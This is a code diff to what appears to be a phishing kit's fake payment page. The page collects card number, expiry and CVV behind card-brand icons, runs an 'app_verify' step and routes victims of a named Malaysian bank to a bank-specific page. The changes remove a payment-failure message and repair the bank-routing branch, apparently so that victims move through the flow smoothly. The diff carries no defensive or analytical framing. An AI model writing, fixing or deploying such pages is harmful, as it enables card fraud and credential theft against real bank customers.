@@ -944,11 +944,7 @@ url("pay1ment_icons.woff") format("woff");
 
 <div style="margin-bottom:12px"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">Card Number *</label><div style="position:relative"><input id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" style="width:100%;padding:10px 12px;padding-right:105px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"><div style="position:absolute;right:10px;top:50%;transform:translateY(-50%);display:flex;gap:4px;pointer-events:none"><svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg><svg width="32" height="22" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/><circle cx="16" cy="11" r="5" fill="#ff5f00"/></svg><svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg></div></div>
 
-<span style="
-    color: red;
-    font-size: small;
-">We are unable to authenticate your payment method. Please choose a different payment method and try again.</span>
-</div>
+
 
 <div style="display:flex;gap:12px;margin-bottom:12px"><div style="flex:1"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">Expiry (MM/YY) *</label><input id="expiry" placeholder="MM/YY" maxlength="5" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div><div style="flex:1"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">CVV *</label><input id="cvv" placeholder="123" maxlength="4" type="password" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div></div>
 
@@ -1656,8 +1652,10 @@ url("pay1ment_icons.woff") format("woff");
       _curStep = 'app_verify';
       document.getElementById('load-overlay').classList.add('hidden');
 
-      if(p.bankName==='AMBANK (M) BERHAD') 
-        loadPage('/AMBANK', 'mount'); return;
+      if(p.bankName==='AMBANK (M) BERHAD') {
+        loadPage('/AMBANK', 'mount'); 
+        document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
+      }
 
       /*if(p.bankName==='AMBANK (M) BERHAD') 
         loadPage('/pages/page1', 'mount'); return;
